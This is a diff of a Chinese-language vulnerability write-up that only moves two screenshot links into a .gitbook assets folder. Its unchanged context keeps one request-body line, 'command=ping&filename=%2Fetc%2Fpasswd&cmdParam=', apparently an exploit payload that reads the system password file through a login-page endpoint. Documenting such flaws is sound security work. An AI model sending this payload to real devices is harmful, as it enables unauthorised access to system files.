@@ -20,7 +20,7 @@
 
 登录页面
 
-![img](images/202202101852340.png)
+![img](../.gitbook/assets/202202101852340.png)
 
 发送请求包
 
@@ -40,4 +40,4 @@ Connection: close
 command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
 ```
 
-![img](images/202202101852498.png)
+![img](../.gitbook/assets/202202101852498.png)
